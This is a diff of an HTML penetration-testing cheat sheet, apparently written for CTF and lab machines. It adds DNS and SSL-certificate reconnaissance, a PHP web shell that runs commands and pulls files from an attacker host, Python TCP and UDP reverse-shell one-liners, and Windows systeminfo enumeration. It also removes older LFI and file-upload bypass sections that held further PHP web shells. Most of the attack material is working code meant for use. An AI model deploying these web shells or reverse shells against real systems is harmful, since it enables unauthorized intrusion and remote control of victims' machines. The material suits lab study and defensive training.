@@ -62,10 +62,16 @@
 <li><a class="reference internal" href="#amap-application-mapper">Amap - Application mapper</a></li>
 </ul>
 </li>
+<li><a class="reference internal" href="#rabbit-holes">Rabbit Holes?</a><ul>
 <li><a class="reference internal" href="#listen-to-the-interface">Listen to the interface</a></li>
+<li><a class="reference internal" href="#dns-server">DNS Server</a></li>
+<li><a class="reference internal" href="#ssl-certificate">SSL Certificate</a></li>
+</ul>
+</li>
 <li><a class="reference internal" href="#from-nothing-to-a-unprivileged-shell">From Nothing to a Unprivileged Shell</a><ul>
 <li><a class="reference internal" href="#searchsploit">searchsploit</a></li>
 <li><a class="reference internal" href="#seclists-org-security-mailing-list-archive">SecLists.Org Security Mailing List Archive</a></li>
+<li><a class="reference internal" href="#google-vulns">Google-Vulns</a></li>
 <li><a class="reference internal" href="#webservices">Webservices</a><ul>
 <li><a class="reference internal" href="#whatweb">whatweb</a></li>
 <li><a class="reference internal" href="#nikto">nikto</a></li>
@@ -74,8 +80,6 @@
 <li><a class="reference internal" href="#wordpress">Wordpress</a></li>
 <li><a class="reference internal" href="#names-possible-usernames-possible-passwords">Names? Possible Usernames? Possible Passwords?</a></li>
 <li><a class="reference internal" href="#brute-forcing-hydra">Brute forcing: hydra</a></li>
-<li><a class="reference internal" href="#lfi-reading-a-php-file">LFI : Reading a php file</a></li>
-<li><a class="reference internal" href="#file-upload">File Upload</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#reverse-shells">Reverse Shells</a><ul>
@@ -94,14 +98,14 @@
 </ul>
 </li>
 <li><a class="reference internal" href="#spawning-a-tty-shell">Spawning a TTY Shell</a><ul>
-<li><a class="reference internal" href="#id6">Python</a></li>
+<li><a class="reference internal" href="#id7">Python</a></li>
 <li><a class="reference internal" href="#sh">sh</a></li>
-<li><a class="reference internal" href="#id7">Perl</a></li>
-<li><a class="reference internal" href="#id8">Ruby</a></li>
+<li><a class="reference internal" href="#id8">Perl</a></li>
+<li><a class="reference internal" href="#id9">Ruby</a></li>
 <li><a class="reference internal" href="#lua">Lua</a></li>
 <li><a class="reference internal" href="#irb">IRB</a></li>
 <li><a class="reference internal" href="#vi">VI</a></li>
-<li><a class="reference internal" href="#id9">Nmap</a></li>
+<li><a class="reference internal" href="#id10">Nmap</a></li>
 <li><a class="reference internal" href="#expect">Expect</a></li>
 <li><a class="reference internal" href="#sneaky-stealthy-su-in-web-shells">Sneaky Stealthy SU in (Web) Shells</a></li>
 </ul>
@@ -127,9 +131,12 @@
 </li>
 <li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell">Unprivileged shell to privileged shell</a><ul>
 <li><a class="reference internal" href="#windows-privilege-escalation">Windows Privilege Escalation</a><ul>
+<li><a class="reference internal" href="#systeminfo">SystemInfo</a></li>
 <li><a class="reference internal" href="#metasploit-local-exploit-suggestor">Metasploit Local Exploit Suggestor</a></li>
-<li><a class="reference internal" href="#sherlock-powershell-script">Sherlock Powershell Script</a></li>
+<li><a class="reference internal" href="#sherlock-and-powerup-powershell-script">Sherlock and PowerUp Powershell Script</a></li>
 <li><a class="reference internal" href="#windows-exploit-suggestor">Windows Exploit Suggestor</a></li>
+<li><a class="reference internal" href="#windows-kernel-exploits">Windows Kernel Exploits</a></li>
+<li><a class="reference internal" href="#icmp-shell">ICMP Shell</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#privilege-escalation-from-g0tm1lk-blog">Privilege escalation from g0tm1lk blog</a><ul>
@@ -180,7 +187,7 @@
 <li><a class="reference internal" href="#login-pages">Login-Pages</a></li>
 <li><a class="reference internal" href="#delete-tags">Delete Tags</a></li>
 <li><a class="reference internal" href="#http-404-custom-page">HTTP 404 Custom Page</a></li>
-<li><a class="reference internal" href="#id13">PHP</a></li>
+<li><a class="reference internal" href="#id15">PHP</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#run-parts">run-parts</a></li>
@@ -198,14 +205,22 @@
 <li><a class="reference internal" href="#password-protected-file">Password Protected File</a><ul>
 <li><a class="reference internal" href="#zip-file">ZIP File</a></li>
 <li><a class="reference internal" href="#rar2john">rar2john</a></li>
+<li><a class="reference internal" href="#keepass2john">keepass2john</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#encrypted-files">Encrypted Files</a><ul>
 <li><a class="reference internal" href="#symmetric-key">Symmetric Key</a></li>
 <li><a class="reference internal" href="#rsa-public-private-key-encryption">RSA Public-Private Key encryption</a></li>
+<li><a class="reference internal" href="#rsa-given-q-p-and-e">RSA given q, p and e?</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#truecrypt-files">Truecrypt Files</a></li>
+<li><a class="reference internal" href="#windows">Windows</a><ul>
+<li><a class="reference internal" href="#get-childitem-mode-values">Get-ChildItem Mode Values</a></li>
+<li><a class="reference internal" href="#zip-or-unzip-using-only-windows-built-in-capabilities">Zip or unzip using ONLY Windows’ built-in capabilities?</a></li>
+<li><a class="reference internal" href="#alternate-data-stream">Alternate Data Stream</a></li>
+</ul>
+</li>
 <li><a class="reference internal" href="#others">Others</a></li>
 </ul>
 </li>
@@ -218,6 +233,34 @@
 </ul>
 </li>
 <li><a class="reference internal" href="#useful-tools">Useful Tools</a></li>
+<li><a class="reference internal" href="#appendix-i-local-file-inclusion">Appendix-I : Local File Inclusion</a><ul>
+<li><a class="reference internal" href="#tools">Tools</a><ul>
+<li><a class="reference internal" href="#filtering-in-lfi">Filtering in LFI</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#lfi-to-remote-code-execution">LFI to Remote Code Execution</a><ul>
+<li><a class="reference internal" href="#file-upload-forms-functions">File upload forms/ functions</a></li>
+<li><a class="reference internal" href="#php-wrapper-expect-command">PHP wrapper expect://command</a></li>
+<li><a class="reference internal" href="#php-wrapper-php-file">PHP wrapper php://file</a></li>
+<li><a class="reference internal" href="#php-wrapper-php-filter">PHP wrapper php://filter</a></li>
+<li><a class="reference internal" href="#php-input-stream">PHP input:// stream</a></li>
+<li><a class="reference internal" href="#data-text-plain-base64-command">data://text/plain;base64,command</a></li>
+<li><a class="reference internal" href="#proc-self-environ">/proc/self/environ</a></li>
+<li><a class="reference internal" href="#proc-self-fd">/proc/self/fd</a></li>
+<li><a class="reference internal" href="#control-over-php-session-values">Control over PHP Session Values</a></li>
+<li><a class="reference internal" href="#email-server">Email Server</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a class="reference internal" href="#appendix-ii-file-upload">Appendix-II File Upload</a><ul>
+<li><a class="reference internal" href="#examples">Examples</a><ul>
+<li><a class="reference internal" href="#simple-file-upload">Simple File Upload</a></li>
+<li><a class="reference internal" href="#simple-file-upload-with-verifying-image-type">Simple File Upload - With verifying image type</a></li>
+</ul>
+</li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -257,7 +300,7 @@
 <ul class="simple">
 <li><a class="reference internal" href="#finding-the-ip-address"><span class="std std-ref">Finding the IP address</span></a></li>
 <li><a class="reference internal" href="#port-scanning"><span class="std std-ref">Port Scanning</span></a></li>
-<li><a class="reference internal" href="#listen-to-the-interface"><span class="std std-ref">Listen to the interface</span></a></li>
+<li><a class="reference internal" href="#rabbit-holes"><span class="std std-ref">Rabbit Holes?</span></a></li>
 <li><a class="reference internal" href="#from-nothing-to-unprivileged-shell"><span class="std std-ref">From Nothing to a Unprivileged Shell</span></a></li>
 <li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell"><span class="std std-ref">Unprivileged shell to privileged shell</span></a></li>
 </ul>
@@ -354,8 +397,10 @@ amap v5.4 finished at 2016-08-10 05:48:16
 </div>
 </div>
 </div>
+<div class="section" id="rabbit-holes">
+<span id="id4"></span><h2>Rabbit Holes?<a class="headerlink" href="#rabbit-holes" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="listen-to-the-interface">
-<span id="id4"></span><h2>Listen to the interface<a class="headerlink" href="#listen-to-the-interface" title="Permalink to this headline">¶</a></h2>
+<span id="id5"></span><h3>Listen to the interface<a class="headerlink" href="#listen-to-the-interface" title="Permalink to this headline">¶</a></h3>
 <p>We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
 18:02:04.096330 IP 192.168.56.1.4444 &gt; 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
@@ -373,6 +418,29 @@ listening on [any] 4444 …
 connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
 0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh
 </pre></div>
+</div>
+</div>
+<div class="section" id="dns-server">
+<h3>DNS Server<a class="headerlink" href="#dns-server" title="Permalink to this headline">¶</a></h3>
+<p>If the targeted machine is running a DNS Server and we have possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>host &lt;domain&gt; &lt;optional_name_server&gt;
+host -t ns &lt;domain&gt;           -- Name Servers
+host -t a &lt;domain&gt;            -- Address
+host -t aaaa &lt;domain&gt;         -- AAAA record points a domain or subdomain to an IPv6 address
+host -t mx &lt;domain&gt;           -- Mail Servers
+host -t soa &lt;domain&gt;          -- Start of Authority
+host &lt;IP&gt;                     -- Reverse Lookup
+host -l &lt;Domain Name&gt; &lt;DNS Server&gt; -- Domain Zone Transfer
+</pre></div>
+</div>
+</div>
+<div class="section" id="ssl-certificate">
+<h3>SSL Certificate<a class="headerlink" href="#ssl-certificate" title="Permalink to this headline">¶</a></h3>
+<p>If the targetted machine is running https server and we are getting a apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>, probably, check the alt-dns-name on the ssl-certificate, create a entry in /etc/hosts and browse with the <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>| ssl-cert: Subject: commonName=examplecorp.com/organizationName=ExampleCorp Ltd./stateOrProvinceName=Attica/countryName=IN/localityName=Mumbai/organizationalUnitName=IT/emailAddress=admin@examplecorp.com
+| Subject Alternative Name: DNS:www.examplecorp.com, DNS:admin-portal.examplecorp.com
+</pre></div>
+</div>
 </div>
 </div>
 <div class="section" id="from-nothing-to-a-unprivileged-shell">
@@ -421,6 +489,10 @@ Webmin 1.x HTML Email Command Execution Vulnerability                           
 <div class="section" id="seclists-org-security-mailing-list-archive">
 <h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Permalink to this headline">¶</a></h3>
 <p>There would be some days, when you won’t find vulnerability in searchsploit. We should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a>, if someone has reported any bug for that particular software.</p>
+</div>
+<div class="section" id="google-vulns">
+<h3>Google-Vulns<a class="headerlink" href="#google-vulns" title="Permalink to this headline">¶</a></h3>
+<p>It is suggested that whenever you are googling something,  also try with the words such as ctf, github, python, tool etc. For example. Let’s say, you are stuck in a docker or in a specific cms search for docker ctf or &lt;cms_name&gt; ctf/ github etc.</p>
 </div>
 <div class="section" id="webservices">
 <h3>Webservices<a class="headerlink" href="#webservices" title="Permalink to this headline">¶</a></h3>
@@ -596,194 +668,6 @@ C=/page/uri     to define a different page to gather initial cookies from
 </pre></div>
 </div>
 </div>
-<div class="section" id="lfi-reading-a-php-file">
-<h4>LFI : Reading a php file<a class="headerlink" href="#lfi-reading-a-php-file" title="Permalink to this headline">¶</a></h4>
-<p>If a website is affected by a LFI, we could use php filter to read the source code of a PHP File</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
-</pre></div>
-</div>
-<p>More information can be found at <a class="reference external" href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using PHP for file inclusion</a></p>
-<p>To test LFI, RFI, we can also use <a class="reference external" href="http://tools.kali.org/web-applications/uniscan">Uniscan</a> Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>uniscan -h
-OPTIONS:
-  -h  help
-  -u  &lt;url&gt; example: https://www.example.com/
-  -f  &lt;file&gt; list of url&#39;s
-  -b  Uniscan go to background
-  -q  Enable Directory checks
-  -w  Enable File checks
-  -e  Enable robots.txt and sitemap.xml check
-  -d  Enable Dynamic checks
-  -s  Enable Static checks
-  -r  Enable Stress checks
-  -i  &lt;dork&gt; Bing search
-  -o  &lt;dork&gt; Google search
-  -g  Web fingerprint
-  -j  Server fingerprint
-
-usage:
-[1] perl ./uniscan.pl -u http://www.example.com/ -qweds
-[2] perl ./uniscan.pl -f sites.txt -bqweds
-[3] perl ./uniscan.pl -i uniscan
-[4] perl ./uniscan.pl -i &quot;ip:xxx.xxx.xxx.xxx&quot;
-[5] perl ./uniscan.pl -o &quot;inurl:test&quot;
-[6] perl ./uniscan.pl -u https://www.example.com/ -r
-</pre></div>
-</div>
-<p>There’s another tool called <a class="reference external" href="https://tools.kali.org/web-applications/fimap">fimap</a>. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.</p>
-<div class="admonition note">
-<p class="first admonition-title">Note</p>
-<p class="last">Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don’t have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.</p>
-</div>
-<p><strong>Filtering in LFI</strong></p>
-<p>Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly.</p>
-<p>For example: the below code only includes the file which are named secret</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php
-  $file = @$_GET[&#39;filname&#39;];
-  if(strlen($file) &gt; 55)
-     exit(&quot;File name too long.&quot;);
-  $fileName = basename($file);
-  if(!strpos($file, &quot;secret&quot;))
-    exit(&quot;No secret is selected.&quot;);
-  echo &quot;&lt;pre&gt;&quot;;
-  include($file);
-  echo &quot;&lt;/pre&gt;&quot;;
-?&gt;
-</pre></div>
-</div>
-</div>
-<div class="section" id="file-upload">
-<h4>File Upload<a class="headerlink" href="#file-upload" title="Permalink to this headline">¶</a></h4>
-<p>Let’s see few examples of File Upload</p>
-<ul class="simple">
-<li>Simple File Upload - Intercepting the request in Burp/ ZAP and changing the file-extension.</li>
-</ul>
-<blockquote>
-<div><p>Below is the PHP code</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?
-
-function genRandomString() {
-  $length = 10;
-  $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;
-  $string = &quot;&quot;;
-
-  for ($p = 0; $p &lt; $length; $p++) {
-      $string .= $characters[mt_rand(0, strlen($characters)-1)];
-  }
-
-  return $string;
-}
-
-function makeRandomPath($dir, $ext) {
-  do {
-  $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;
-  } while(file_exists($path));
-  return $path;
-}
-
-function makeRandomPathFromFilename($dir, $fn) {
-  $ext = pathinfo($fn, PATHINFO_EXTENSION);
-  return makeRandomPath($dir, $ext);
-}
-
-if(array_key_exists(&quot;filename&quot;, $_POST)) {
-  $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);
-
-
-      if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {
-      echo &quot;File is too big&quot;;
-  } else {
-      if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {
-          echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;
-      } else{
-          echo &quot;There was an error uploading the file, please try again!&quot;;
-      }
-  }
-} else {
-?&gt;
-&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt;
-&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt;
-Choose a JPEG to upload (max 1KB):&lt;br/&gt;
-&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;
-&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;
-&lt;/form&gt;
-&lt;? } ?&gt;
-</pre></div>
-</div>
-<p>If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.</p>
-<ul class="simple">
-<li>Create a fake JPG containing php code.</li>
-</ul>
-<blockquote>
-<div><p>We’ll be using system() to read our password.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>echo &quot;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&quot; &gt; shell.jpg
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Upload JPG, intercept in Burp/ ZAP and change the extension</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>&lt;input name=&quot;filename&quot; value=&quot;o0xn5q93si.jpg&quot; type=&quot;hidden&quot;&gt;
-</pre></div>
-</div>
-<p>is changed to</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;input name=&quot;filename&quot; value=&quot;o0xn5q93si.php&quot; type=&quot;hidden&quot;&gt;
-</pre></div>
-</div>
-</div></blockquote>
-</div></blockquote>
-<ul class="simple">
-<li>Simple File Upload - With verifying image type</li>
-</ul>
-<blockquote>
-<div><p>In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php
-...
-
-else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) {
-      echo &quot;File is not an image&quot;;
-  }
-
-...
-
-?&gt;
-</pre></div>
-</div>
-<p>Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a “Magic Number” at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.</p>
-<ul class="simple">
-<li>Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let’s say first 100 bytes)</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>hexdump -n 100 -e &#39;100/1 &quot;\\x%02X&quot; &quot;\n&quot;&#39; sunflower.jpg
-
--n length         : Interpret only length bytes of Input
--e format_string  : Specify a format string to be used for displaying data
-</pre></div>
-</div>
-<p>Example:</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>hexdump -n 100 -e &#39;100/1 &quot;\\x%02X&quot; &quot;\n&quot;&#39; sunflower.jpg
-\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Create a file with JPG header and command shell code using python</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>&gt;&gt;&gt; fh = open(&#39;shell.php&#39;,&#39;w&#39;)
-&gt;&gt;&gt; fh.write(&#39;The Hexdump from above \xFF\xD8\xFF\xE0&#39; + &#39;&lt;? passthru($_GET[&quot;cmd&quot;]); ?&gt;&#39;)
-&gt;&gt;&gt; fh.close()
-</pre></div>
-</div>
-</div></blockquote>
-</div></blockquote>
-<div class="admonition tip">
-<p class="first admonition-title">Tip</p>
-<p class="last">Do check the source code of the page for any client-side file validation or any commented hidden parameters?</p>
-</div>
-</div>
 </div>
 <div class="section" id="reverse-shells">
 <h3>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permalink to this headline">¶</a></h3>
@@ -833,6 +717,17 @@ else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) 
 -b, --cookie &lt;data&gt; (HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a &quot;Set-Cookie:&quot; line.  The data should be in the format &quot;NAME1=VALUE1; NAME2=VALUE2&quot;.
 </pre></div>
 </div>
+<p>If you also want to provide upload functionality (Imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php
+ if (isset($_REQUEST[&#39;fupload&#39;])) {
+  file_put_contents($_REQUEST[&#39;fupload&#39;], file_get_contents(&quot;http://yourIP/&quot; . $_REQUEST[&#39;fupload&#39;]));
+ };
+ if (isset($_REQUEST[&#39;cmd&#39;])) {
+  echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &quot;&lt;/pre&gt;&quot;;
+ }
+?&gt;
+</pre></div>
+</div>
 </div></blockquote>
 <ul class="simple">
 <li><strong>PHP Meterpreter</strong></li>
@@ -880,7 +775,12 @@ else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) 
 </div>
 <div class="section" id="python">
 <h4>Python<a class="headerlink" href="#python" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+<p>TCP</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</pre></div>
+</div>
+<p>UDP</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>import os,pty,socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect((&quot;10.10.14.17&quot;, 4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&quot;HISTFILE&quot;,&#39;/dev/null&#39;);pty.spawn(&quot;/bin/sh&quot;);s.close()
 </pre></div>
 </div>
 </div>
@@ -960,8 +860,8 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 <div class="section" id="spawning-a-tty-shell">
 <h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
 <p>Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a class="reference external" href="https://netsec.ws/?p=337">Spawning a TTY Shell</a> and <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> has provided multiple ways to get a tty shell</p>
-<div class="section" id="id6">
-<h4>Python<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id7">
+<h4>Python<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 </pre></div>
 </div>
@@ -979,8 +879,8 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 </pre></div>
 </div>
 </div>
-<div class="section" id="id7">
-<h4>Perl<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id8">
+<h4>Perl<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>perl -e <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
 </pre></div>
 </div>
@@ -988,8 +888,8 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 </pre></div>
 </div>
 </div>
-<div class="section" id="id8">
-<h4>Ruby<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id9">
+<h4>Ruby<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>ruby: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
 </pre></div>
 </div>
@@ -1023,8 +923,8 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 </div>
 <p>Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.</p>
 </div>
-<div class="section" id="id9">
-<h4>Nmap<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id10">
+<h4>Nmap<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
 <p>(From within nmap)</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>!sh
 </pre></div>
@@ -1290,12 +1190,74 @@ cat ~/.bash_logout
 </div>
 </div>
 <div class="section" id="unprivileged-shell-to-privileged-shell">
-<span id="id11"></span><h2>Unprivileged shell to privileged shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
+<span id="id12"></span><h2>Unprivileged shell to privileged shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
 <p>Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.</p>
 <p>If you have become a normal user of which you have a password, it would be a good idea to check sudo -l to check if there are any executables you have permission to run.</p>
 <div class="section" id="windows-privilege-escalation">
 <h3>Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Permalink to this headline">¶</a></h3>
-<p>If you have a meterpreter from a windows box, probably, the first thing would be to utilize</p>
+<p>If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize</p>
+<div class="section" id="systeminfo">
+<h4>SystemInfo<a class="headerlink" href="#systeminfo" title="Permalink to this headline">¶</a></h4>
+<p>Run system info and findout</p>
+<ul class="simple">
+<li>Operating System Version</li>
+<li>Architecture : Whether x86 or x64.</li>
+<li>Hotfix installed</li>
+</ul>
+<p>The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>systeminfo
+
+Host Name:                 VICTIM-MACHINE
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00496-001-0001283-84782
+Original Install Date:     18/3/2017, 7:04:46 ��
+System Boot Time:          7/11/2017, 3:13:00 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
+                           [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     2.048 MB
+Available Physical Memory: 1.640 MB
+Virtual Memory: Max Size:  4.095 MB
+Virtual Memory: Available: 3.665 MB
+Virtual Memory: In Use:    430 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.9
+</pre></div>
+</div>
+<p>If there are no Hotfixes installed, we can visit</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>C:\Windows\SoftwareDistribution\Download
+</pre></div>
+</div>
+<p>This directory is the temporary location for WSUS. Updates were downloaded here, doesn’t mean were installed. Otherwise, we may visit</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>C:\Windows\WindowUpdate.log
+</pre></div>
+</div>
+<p>which will inform if any hotfixes are installed.</p>
